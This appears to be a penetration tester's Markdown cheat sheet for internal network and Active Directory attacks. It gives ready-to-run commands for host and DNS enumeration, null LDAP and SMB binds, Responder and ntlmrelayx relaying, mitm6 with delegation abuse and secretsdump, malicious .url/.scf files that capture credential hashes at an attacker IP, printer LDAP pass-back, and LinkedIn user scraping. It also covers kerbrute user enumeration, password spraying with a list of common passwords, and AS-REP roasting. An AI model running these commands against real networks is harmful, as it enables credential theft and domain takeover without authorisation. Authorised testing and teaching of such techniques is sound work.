
## Initial Enumeration
Workflow
1. NMAP ping scann all
2. NMAP run full scan all
3. NMAP scan the ping scan results
4. SMB Search
5. Find All Hostnames
6. Find DNS Footprinting
7. DNS Zone Transfers
8. SSL Checks
9. SMB Signing Check

#### Scan all living hosts for ports
About
	Workflow
	- ping subnets for hosts
	- quick scan hosts
	- Full scan hosts"
```
# Find all live hosts
nmap -sP -iL <IP FILE> -oA NmapLiveHosts.txt

# TEST THIS, Ping scan without port scan or DNS resolution
nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v "host down"

# Scan Live Hosts
nmap -A -p- -iL NmapLiveHosts.txt  >> NmapHostsSummary.txt

# UDP NMAP Scan
sudo nmap -A-sU -Pn -iL NmapLiveHosts.txt  

# Alternate
fping -asgq X.X.X.X/24

```
#### Generate Pretty Nmap Scan
```
nmap -sV IP_ADDRESS -oX scan.xml && xsltproc scan.xml -o "`date +%m%d%y`_report.html"
```
#### TESTING NMAP into Searchsploit Automatic
```
nmap -p- -sV -oX a.xml IP_ADDRESS; searchsploit --nmap a.xml
```
#### Find the AD/DC
```
# Easy way to find DC
Run CME to find domain name
Nslookup the domain name, typicall finds all DC's registered to the domain name

# Find the DC
nslookup -q=srv _ldap._tcp.dc._msdcs.<domain.name>
nslookup -type=srv _ldap._tcp.<domain.name> | grep ldap | cut -d ' ' -f 6 |
sudo nmap  -p 389 -oG - <IPS>| grep "open" | awk '{print $2}'

# Get Domain name and all system names
Crackmapexec smb X.X.X.X/24
smbmap -H 10.10.10.10 -u '' -p ''

```
#### Attack the DC
```
# Null LDAP Bind
enum4linux X.X.X.X -A
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut f1 -d"]"

#SMB MAP ALWAYS
smbclient -L \\\\x.x.x.x

# NMAP To find Users
nmap -n -sV --script "ldap* and not brute" -p 389

# LDAPS to find Users
ldapsearch -H ldaps://X.X.X.X:636 -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -H ldap://X.X.X.X:389 -x -s base -b '' "(objectClass=*)" "*" +

THEN
ldapsearch -x -H ldap://X.X.X.X:389 -D '' -w '' -b "DC=domain, DC=local"
```
#### Take a screenshot of all websites, dont forget for any uncommon ports or 8080,8443
```
eyewitness Port 80,443
eyewitness --web -f <nmap IP file>
```
#### Find all Hostnames
```
Crackmapexec smb X.X.X.X/24
```
#### DNS
About
DNS Records:
	- A returns IPV4 address of the domain
	- AAAA IPV6 address
	- MX mail servers
	- NS name server information
	- TXT contains whatever strings you want
	- CNAME serves as an alias
	- PTR to work for reverse lookup turning IP address to Domain name
	- SOA provides info about the DNS zone and email of the administrator to contact
```
# Reach SOA
	soa www.domain.com
# Enumerate
	dig ns domain.com @X.X.X.X
# Version Query
dig CH TXT version.bind X.X.X.X

# Find any record
dig any domain.com @X.X.X.X

# Zone Transfer
Transfer a zone to another server in DNS over port 53. Typically a domain will have a backup DNS server, we are just looking to see if there are any discrepancies in the records. We may identify more information

	dig axfr domain.com @X.X.X.X
```
#### For Pentests - SSL Checks
```
sslscan X.X.X.X
```

# LLMN and NBT-NS Attacks
#### Responder + relay attack
- What is it?
LLMNR is a layer 2 process that works for DNS in the case of DNS failure, this is an old protocol. If a system can't identify its host with DNS it will use LLMNR to ask all locally connected network devices to resolve the DNS information which can be captured to identify a users hash. NBT-NS will occur if LLMNR fails to resolve, also a layer 2 process that attempts to find hosts by the Netbios name.

- How to perform it:
	- Linux
```
Find targets (Should be done in initial enumeration):
	nmap -p 445 --script=smb2-security-mode X.X.X.X
	nmap -p 139--script=smb2-security-mode X.X.X.X

# Responder
	responder -wrfvPd –I eth0

# Relay
	impacket-Ntlmrelayx.py -tf targets.txt -smb2support --output-file ResponderHashes.txt
	Nc 127.0.0.1 11000 
	impacket-Ntlmrelayx.py --add-computer

# Dont forget
	Hashes will be saved into a file so you will want to read the file to get user hashes

# Cracking Hashes 
	NTLM: hashcat -m 5600
```

- Windows
```
# Powershell Execution Policy
This will reset the policy once the script ends to not change the system
	set-excectutionpolicy bypass -scope Process 

#Inveigh
	Import-module .\Inveigh.ps1

# List Options
	(Get-Command Invoke-Inveigh).parameters

# Run
	Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
#### MITM6
- What is it?
This exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. As DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server. 

- How to perform it:
```
# Dump AD Information
	mitm6 -d DOMAIN --ignore-nofqdn
	Ntlmrelayx.py -6 –t ldaps://IP of DC –wh fakewpad.DOMAIN -l loot.txt  --no-smb-server -i

Combine mitm6, ntlmrelayx and RBCD to abuse AD defaults.
	mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
	ntlmrelayx.py -t ldaps://icorp-dc.internal.corp -wh attacker-wpad --delegate-access
	getST.py -spn cifs/example.local example.local/NEW_PC_NAME\$ - impersonate admin
	export KRB5CCNAME=admin.ccache
	secretsdump.py -k -no-pass admin.ccache
	
# Relay an SMB authentication request to the DC. If it’s a DA account and vuln to CVE-
2019-1019, it will make a new DA account.
	mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
	ntlmrelayx.py -t ldaps://example.local -smb2support --remove-mic

 # Basic users can create computer accounts. This can help gain a foothold into AD.
	mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
	ntlmrelayx.py -t ldaps://example.local --add-computer
```

#### File URL Attack
- What is it?
A URL file attack takes advantage of how a .url file works to capture a users credential by having the use request an icon from the attackers machine. Simply place a file with the below code (edit the IP address) and place it in any SMB share you would like. If it works correctly, anytime someone visits the file share, their password hash will relay to your responder.

- How to perform it?
```
# The .URL code
[InternetShortcut]
URL=http://google.com
WorkingDirectory=%username%
IconFile=\\192.168.1.240\%USERNAME%.icon
IconIndex=1

# Also done with an SCF file
[Shell]
Command=2
IconFile=\\192.168.1.240\Share\test.ico
[Taskbar]
Command=ToggleDesktop

# Capture Credentials
responder -I eth0 -rdwv

```

#### Printer LDAP Pass-Back Attack
About:
- If a printer is integrated with LDAP, you can attack it in 2 ways. The first is to relay the printer accounts password but altering the server IP address its integrated with. The second involves running an LDAP server itself, follow the link for more instructions. https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210
```
# LDAP Pass Back Attack" Attack 1
On your box, setup a netcat listener for port 389 (can be any port but this is less likely to be blocked)

# On the printers settings page, change the server address to your IP address and port, update.
You should now capture the printers password
```

# Username Attacks

## Build a User list
#### 1. Websites OSINT
- What is it?
	- Review public websites to identify username structure, email structure, documents that provide information like password policy, technology or software used in the organization, types of jobs, actual user emails, and breached data. ENSURE YOU CRAWL the company pages for words to help with password cracking, password spraying etc.

- How to Perform it:
```
Dehashed
Crawl the Company website
LinkedIn
Github
Indeed posting
Glassdoor
```
#### 2. LinkedIn Scrape
- What is it?
	- Custom linked in code places into the dev console to scrape all linkedIn users from a company page. This isnt a pretty method but it doesnt get stopped by LinkedIn which many scrapers eventually are prevented from running and you have to find a new one, this hasn't been stopped yet.

- How to Perform it:
```
1. Go to the link www.linkedin.com/company/{company_name}/people
2. Open dev tools - console
3. Input this javascript code to get the users, you need to scroll down and hit more users so all populate.
4. This does not work if it's a school, haven't figured it out yet. (Shout out to Ellie for this awesome code)

	const profileTitles = document.querySelectorAll('.org-people-profile-card__profile-title');
	    let textList = '';
	    for (let i = 0; i < profileTitles.length; i++) {
	    if (profileTitles[i].innerText === "LinkedIn Member") {
	       continue;
	    }
	    textList += profileTitles[i].innerText + '\n';
	    }
	    console.log(textList);

# Turn results into userlist
	awk '{split($1, first, ""); last = $2; gsub(" ", "", last); print toupper(first[1]) tolower(last)}' your_file.txt
```

#### 3. Kerberos/LDAP/SMB: Users
- What is it?

- How to Perform it:
```
#Various methods
	nmap -p88 --script krb5-enum-users --script args="krb5-enum-users.realm''DOMAIN' .userdb=USERLIST X.X.X.X
	enum4linunx -U X.X.X.X
	impacket-lookupsid Domain/guest@x.x.x.x
	smbclient -U domain/admin \\\\X.X.X.X\\IPC$ 

```

#### 4. Printers Enumeration Users
What is it?
Attempt to use default credentials to login to printers and looks at users who have printed items, look for address books, etc. Printers typically store username data. If they are LDAP integrated then you may have additional attack vectors.
- How to Perform it:
```
#Find printers in the network and see if they have admin open or default creds
use the address book to add users to your list
```

#### 5. RPC Client
What is it?
Remote Procedure Call is a software communication protocol that one program can use to request a service from a program located in another computer on a network without having to understand the network's details. RPC is used to call other processes on the remote systems like a local system. A procedure call is also sometimes known as a function call or a subroutine call.

- How to Perform it:
```
rpcclient -U '' -N x.x.x.x  then enumdomusers
```

#### 6. Default Credentials
What is it?
Pretty simple, check all logins, hardware, etc for default credentials or easy credentials such as the password being the same as the username.

- How to Perform it:
```
# Resources
	https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
	https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv

# MSF
	msfconsole > use auxiliary/scanner/*
	
	Check the Port/Protocol page for default credential testing specifics
```
#### 7. Ldap Null Bind enumeration
What is it?
Anyone that is in the network can enumerate Active Directory information by querying the DC.

How to Perform it:
```
#Impacket
GetADUsers.py DC.local/ -dc-ip 10.10.10.10 -debug

	Clean Up the output of above
	CAPTURE USERS
	awk -F: '{print $1}' your_file.txt
	
	Capture Passwords
	awk -F: '{print $3}' your_file.txt
	
	GET RID of EMAIL Extension
	awk -F'\\' '{print $2}'

# CrackmapExec
crackmapexec smb X.X.X.X/24 --users
```

#### 8. RID Bruteforcing
What
Enumerate user accounts through null sessions by brute forcing RID's.

How to Perform it:
```
Impacket-samrdump.py 10.129.14.128
```
-------- 
## Testing User list
-------- 
#### Kerbrute
- What is it?
	- Tests usernames for valid accounts by sending a TGS request without pre-authentication to the DC. If the KDC responds with principal unknown error, username doesn't exist. If it prompts for pre-authentication, its a valid user.
- How to perform it:
```
# Validate legit users
	kerbrute userenum -d DOMAIN.com --dc X.X.X.X username.txt -o validUsers

# Test for default usernames or typical names
	Kerbrute typical username wordlists, I personnally have a username list compiled from y many pentests.
```
#### Password Stuff
- What is it?
	- Stuffing known passwords, easy passwords, into the usernames to find a valid credential combination.

- How to perform it:
```
# Here we need to test one password at a time to prevent lockout
crackmapexec smb x.x.x.x -U username.txt -P passwordStuff --continue-on-success 

# When you have usernames try the following password styles
- Use their name
- password
- the company name
- brute force
- see the Tips and Tricks for typical passwords I see a lot

# What I have seen
	I can typically compromise an account using a variation of password, or the company name if I have an extensive user list. Ensure you have the password policy prior to the engagement to avoid lockouts, this isn't a red team, be smart.
Welcome1
Password1
P@ssw0rd1
sqlserver
Passw0rdYEARMONTH
HappyHolidaysYEAR
Password123!
COMPANYNAMEYEAR
Serviceaccounts passwords is the username
companyname@1234
comapnynameNEXTYEAR
companynameLASTYEAR
P@$$w0rd
comapnynameYEAR!
Passw0rd
training
Password123456

```

#### ASREP
- What is it?
	- Check for ASREP roasting only if you have a valid list of users. You will perform this again when you have valid credentials UNLESS the client had a null ldap bind which output all AD users.

- How to perform it:
```
# Get hashes with no krb preauth, (add domain to your hosts file)
	cme ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
	
	GetNPUsers.py 'DC.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.10
	
# Crack the Hash
	Hashcat module  18200


